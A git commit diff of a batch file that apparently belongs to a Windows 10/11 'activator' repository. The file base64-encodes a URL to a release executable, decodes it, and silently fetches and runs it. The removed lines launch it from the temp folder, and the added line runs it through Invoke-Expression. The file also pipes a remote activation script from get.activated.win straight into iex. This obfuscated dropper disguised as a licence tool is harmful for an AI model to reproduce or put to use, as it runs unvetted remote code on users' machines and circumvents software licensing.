822ad62e28658991b8484228715080bb78a8d245
betamod9 <164927681+betamod9@users.noreply.github.com>
2025-01-10 03:32:30 +0200

    Update windows.bat

--- windows.bat
+++ windows.bat
@@ -1,13 +1,5 @@
 @echo off
 set "b64=aHR0cHM6Ly9naXRodWIuY29tL2JldGFtb2Q5L1dpbmRvd3MtMTAtYW5kLTExLUFjdGl2YXRvci9yZWxlYXNlcy9kb3dubG9hZC8xMi4yNy4yMDI0L1dpbmRvd3NLZXkuZXhl"
 for /f "tokens=*" %%a in ('powershell "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%b64%'))"') do set "url=%%a"
-set "filename=%temp%\windowskeyactivation.exe"
-powershell -Command "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri '%url%' -OutFile '%filename%'" >nul 2>&1
-if exist "%filename%" (
-    timeout /t 5 /nobreak >nul
-    start "" "%filename%"
-) else (
-    goto server
-)
-:server
+powershell -Command "$ProgressPreference = 'SilentlyContinue'; Start-Sleep -Seconds 5; Invoke-Expression (irm '%url%')"
 powershell -Command "$ProgressPreference = 'SilentlyContinue'; irm https://get.activated.win | iex"
